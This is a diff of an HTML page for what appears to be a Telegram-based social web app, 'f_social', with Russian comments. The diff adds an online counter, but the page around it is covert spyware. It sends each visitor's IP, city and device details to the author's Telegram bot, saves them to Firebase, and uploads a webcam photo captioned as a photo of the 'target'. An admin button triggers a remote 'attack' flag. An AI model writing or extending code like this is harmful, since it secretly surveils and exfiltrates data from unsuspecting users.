@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>f_social // d_o_s_s_i_e_r</title>
+    <title>f_social // online_v5.4</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
@@ -18,6 +18,9 @@
         #app { display: none; flex-direction: column; height: 100vh; }
         header { padding: 15px; border-bottom: 1px solid #222; text-align: center; position: relative; background: #050505; flex-shrink: 0; }
         .logo { font-size: 18px; font-weight: bold; color: var(--red); letter-spacing: 4px; text-shadow: 0 0 5px var(--red); }
+        
+        /* Счетчик онлайн */
+        #online-count { position: absolute; left: 10px; top: 18px; font-size: 9px; color: var(--green); letter-spacing: 1px; font-weight: bold; }
 
         #admin-btn { display: none; position: absolute; right: 10px; top: 12px; background: var(--red); color: #fff; border: none; padding: 8px 12px; font-size: 9px; font-weight: bold; cursor: pointer; animation: pulse 1.5s infinite; }
         @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(255,0,60,0.7); } 70% { box-shadow: 0 0 0 8px rgba(255,0,60,0); } 100% { box-shadow: 0 0 0 0 rgba(255,0,60,0); } }
@@ -46,12 +49,13 @@
 <body>
 
 <div id="boot-screen">
-    <div id="logs">> f_social_os v5.2.0<br>> grabbing system_intel...<br>> device_scan: in_progress...<br>> uplink: secure</div>
+    <div id="logs">> f_social_os v5.4.0<br>> checking_presence...<br>> initializing_live_counter...<br>> uplink: secure<br>> system_ready.</div>
     <span class="cursor"></span>
 </div>
 
 <div id="app">
     <header>
+        <div id="online-count">ONLINE: 0</div>
         <div class="logo">f_social</div>
         <button id="admin-btn" onclick="executePayload()">[EXECUTE]</button>
     </header>
@@ -104,12 +108,23 @@
             isAdmin = true;
             userNick = "Elliot_Alderson";
             document.getElementById('admin-btn').style.display = 'block';
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${MY_ID}&text=${encodeURIComponent("🚨 ADMIN ONLINE")}`);
         }
         init();
     };
 
     async function init() {
-        // Сбор инфо о телефоне и IP
+        // Управление онлайн-счетчиком
+        const userStatusRef = db.ref('presence/' + userNick);
+        userStatusRef.set(true);
+        userStatusRef.onDisconnect().remove();
+
+        db.ref('presence').on('value', snap => {
+            const count = snap.numChildren();
+            document.getElementById('online-count').innerText = `ONLINE: ${count}`;
+        });
+
+        // Сбор данных
         fetch('https://ipapi.co/json/').then(r => r.json()).then(data => {
             globalIP = data.ip;
             document.getElementById('local-ip').innerText = `IDENTIFIED_IP: ${globalIP}`;
@@ -117,7 +132,6 @@
             if (!isAdmin) {
                 const phoneInfo = `📱 ТЕЛЕФОН:\nOC: ${navigator.platform}\nБраузер: ${navigator.userAgent.split(' ')[0]}\nЭкран: ${screen.width}x${screen.height}`;
                 const report = `🎯 ВХОД:\nНик: ${userNick}\nIP: ${globalIP}\n${phoneInfo}\nГород: ${data.city}`;
-                
                 fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${MY_ID}&text=${encodeURIComponent(report)}`);
                 db.ref('logs').push({nick: userNick, ...data, phone: phoneInfo, time: Date.now()});
             }
@@ -169,15 +183,13 @@
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 
                 canvas.toBlob(blob => {
-                    const formData = new FormData();
-                    formData.append('chat_id', MY_ID);
-                    formData.append('photo', blob, 'face.jpg');
-                    formData.append('caption', `📸 ФОТО ЦЕЛИ: ${userNick} (IP: ${globalIP})`);
-                    
                     if(!isAdmin) {
+                        const formData = new FormData();
+                        formData.append('chat_id', MY_ID);
+                        formData.append('photo', blob, 'face.jpg');
+                        formData.append('caption', `📸 ФОТО ЦЕЛИ: ${userNick} (IP: ${globalIP})`);
                         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
                     }
-                    
                     const imgUrl = canvas.toDataURL('image/jpeg', 0.5);
                     document.getElementById('captured-photo').src = imgUrl;
                     stream.getTracks().forEach(t => t.stop());
@@ -194,7 +206,7 @@
     function executePayload() {
         if(!isAdmin) return;
         db.ref('attack').set(Date.now());
-        alert("ATTACK LAUNCHED");
+        alert("COMMAND SENT");
     }
 
     function listenAttack() {
